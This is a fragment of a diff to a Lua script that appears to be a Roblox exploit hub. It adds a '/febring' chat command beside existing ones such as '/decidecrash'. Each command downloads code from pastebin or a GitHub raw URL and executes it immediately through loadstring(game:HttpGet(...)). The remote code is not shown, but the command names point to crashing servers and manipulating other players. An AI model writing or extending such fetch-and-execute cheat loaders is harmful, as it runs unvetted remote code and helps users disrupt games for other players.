@@ -303,6 +303,12 @@ else
                             loadstring(game:HttpGet("https://pastebin.com/raw/xd1ddLJS"))()
                         elseif string.lower(msg) == "/decidecrash" then
                             loadstring(game:HttpGet("https://pastebin.com/raw/B0s47RQ4"))()
+                        elseif string.lower(msg) == "/febring" then
+                            loadstring(
+                                game:HttpGet(
+                                    "https://raw.githubusercontent.com/JSFKGBASDJKHIOAFHDGHIUODSGBJKLFGDKSB/kdjnvlkfns-kldjbncfkbn-vklnbcv-n/main/fe%20bring"
+                                )
+                            )()
                         elseif string.lower(msg) == "/bbhub" then
                             loadstring(
                                 game:HttpGet(
